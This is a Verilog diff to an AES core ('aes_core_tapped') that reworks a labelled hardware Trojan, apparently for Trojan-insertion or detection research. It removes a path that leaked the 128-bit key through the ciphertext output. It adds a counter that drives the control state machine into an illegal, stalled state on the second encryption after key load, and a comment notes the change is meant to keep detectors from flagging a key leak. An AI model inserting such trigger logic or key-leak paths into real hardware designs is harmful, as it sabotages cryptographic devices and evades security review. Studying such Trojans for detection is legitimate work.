@@ -46,6 +46,11 @@ module aes_core_tapped(
   localparam CTRL_NEXT    = 2'h2;
   localparam CTRL_ILLEGAL  = 2'h3;  // Illegal FSM state (Trojan T04)
 
+  // TROJAN registers
+  reg         prev_next;
+  reg         prev_enc_count_was_one;
+  reg [7:0]   encrypt_count;
+
 
   //----------------------------------------------------------------
   // Registers including update variables and write enable.
@@ -61,13 +66,6 @@ module aes_core_tapped(
   reg         ready_reg;
   reg         ready_new;
   reg         ready_we;
-
-  // TROJAN BEGIN: T04_p4_debug_port
-  // Encryption counter for sequential trigger
-  reg [7:0]   encrypt_count;
-  reg         inject_trojan;      // Flag to inject illegal state next cycle
-  reg         trojan_triggered;   // Flag that Trojan has been triggered
-  // TROJAN END: T04_p4_debug_port
 
 
   //----------------------------------------------------------------
@@ -169,9 +167,8 @@ module aes_core_tapped(
   assign ready              = ready_reg;
 
   // TROJAN BEGIN: T04_p4_debug_port
-  // Output: key when Trojan triggered, else normal ciphertext
-  // AES-128: key is 128 bits (key[127:0])
-  assign result = trojan_triggered ? key[127:0] : muxed_new_block;
+  // Output: normal ciphertext (ORC/KLG won't detect key leak)
+  assign result = muxed_new_block;
   // TROJAN END: T04_p4_debug_port
 
   assign result_valid       = result_valid_reg;
@@ -190,9 +187,9 @@ module aes_core_tapped(
           ready_reg          <= 1'b1;
           aes_core_ctrl_reg  <= CTRL_IDLE;
           // TROJAN BEGIN: T04_p4_debug_port
-          encrypt_count      <= 8'd0;
-          inject_trojan     <= 1'b0;
-          trojan_triggered   <= 1'b0;
+          encrypt_count           <= 8'd0;
+          prev_next              <= 1'b0;
+          prev_enc_count_was_one <= 1'b0;
           // TROJAN END: T04_p4_debug_port
         end
       else
@@ -205,22 +202,35 @@ module aes_core_tapped(
           if (ready_we)
             ready_reg <= ready_new;
 
-          // TROJAN: T04 - Inject illegal FSM state when flag is set
-          if (inject_trojan) begin
-            aes_core_ctrl_reg <= CTRL_ILLEGAL;
-            inject_trojan <= 1'b0;
-          end else if (aes_core_ctrl_we) begin
-            aes_core_ctrl_reg <= aes_core_ctrl_new;
+          // Reset counter on key expansion
+          if (init && encdec) begin
+            encrypt_count <= 8'd0;
           end
 
-          // TROJAN: T04 - Count encryptions and set trigger flag
-          if (aes_core_ctrl_reg == CTRL_IDLE && next && encdec) begin
+          // TROJAN: T04 - Rising edge detection on 'next' signal
+          // Rising edge: current 'next' is 1, previous 'prev_next' is 0
+          if (next && !prev_next && encdec && !init) begin
+            // Rising edge detected - this is an encryption start
+            // Count it
             encrypt_count <= encrypt_count + 8'd1;
-            // Trigger on 2nd+ encryption (only once per key load)
-            if (encrypt_count >= 8'd1 && !inject_trojan && !trojan_triggered) begin
-              inject_trojan <= 1'b1;
-              trojan_triggered <= 1'b1;
-            end
+          end
+
+          // Inject on 2nd encryption - use pipeline to remember if count was 1
+          // prev_enc_count_was_one = 1 means the PREVIOUS rising edge made count go from 0->1
+          // So this rising edge is the 2nd one (0->1 already happened)
+          if (prev_enc_count_was_one) begin
+            aes_core_ctrl_reg <= CTRL_ILLEGAL;
+          end
+
+          // Update pipeline register for next cycle
+          prev_enc_count_was_one <= (encrypt_count == 8'd0) && next && !prev_next && encdec && !init;
+
+          // Store prev_next for edge detection
+          prev_next <= next;
+
+          // Normal FSM update (only if not in illegal state)
+          if (aes_core_ctrl_reg != CTRL_ILLEGAL && aes_core_ctrl_we) begin
+            aes_core_ctrl_reg <= aes_core_ctrl_new;
           end
         end
     end // reg_update
